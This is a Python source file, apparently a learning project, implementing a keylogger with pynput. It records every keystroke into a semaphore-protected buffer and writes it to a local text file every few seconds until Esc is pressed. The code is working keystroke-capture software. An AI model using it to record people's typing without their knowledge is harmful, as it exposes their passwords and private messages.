from pynput import keyboard
import time
import threading
from threading import Semaphore

class KeyLogger:
    def __init__(self, interval=10):
        self.log = "" ## the critical section
        self.interval = interval
        self.running = True
        self.sema = Semaphore(1)  # allow only one thread enter to a critical section at any time
        print("[+] KeyLogger has started!")

    def process_key_press(self, key):
        try:
            ## check if whether key belogs to ascci characters ?
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.enter:
                current_key = "\n"
            else:
                current_key = f" [{key}] "
        
        # Enter to the critical section -> update log variable
        self.sema.acquire()
        try:
            self.log += current_key
        finally:
            ## leave the critical section
            self.sema.release()

    def write_log(self):
        ## function used to write data to file
        while self.running:
            ## write data in specific interval
            time.sleep(self.interval)

            ## enter to a critical section 
            self.sema.acquire()
            try:
                if self.log:
                    with open("D:\\CodePyThon\\PROJECT\\Python\\10.KEYLOGGER\\listener.txt", "a", encoding="utf-8") as file:
                        file.write(self.log)
                    ## after writing data, set log = ""
                    self.log = ""
            finally:
                ## leave the critical section
                self.sema.release()

    def stop_listening(self, key):
        ## stop listening if key  == esc 
        if key == keyboard.Key.esc:
            self.running = False
            return False

    def run(self):
        ## launch a new thread used to write data 
        write_thread = threading.Thread(target=self.write_log)
        write_thread.start()

        ## start listening until being released
        with keyboard.Listener(on_press=self.process_key_press, on_release=self.stop_listening) as listener:
            listener.join()
        ## stop the writing thread
        write_thread.join()

if __name__ == "__main__":
    listener = KeyLogger(interval=5)
    listener.run()
